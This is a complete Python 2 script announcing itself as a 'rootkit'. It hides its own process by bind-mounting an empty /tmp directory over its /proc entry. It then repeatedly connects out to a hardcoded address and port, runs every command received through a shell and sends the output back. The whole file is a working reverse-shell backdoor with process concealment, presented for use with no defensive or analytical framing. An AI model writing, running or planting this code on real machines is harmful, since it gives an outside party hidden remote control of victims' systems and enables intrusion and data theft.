#!/usr/bin/python

import os
import socket
import subprocess
import string
import time
import random as r

ch = string.uppercase + string.digits
token = "".join(r.choice(ch) for i in range(5))
pid = os.getpid()
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
host = "10.0.0.64"
port = 5539
print "[+]Rootkit is working now , check your connection  .. "
def MakeConnection(h, p):
    try:
                time.sleep(5)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((h, p))
                while True:
                                command =  sock.recv(1024)
                                if command.strip("\n") == "exit":
                                     sock.close()
                                proc = subprocess.Popen(command, stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True) # Execute the sent command
                                proc_result = proc.stdout.read() + proc.stderr.read()
                                sock.send(proc_result)
    except socket.error:
                pass
while True:
        MakeConnection(host, port)
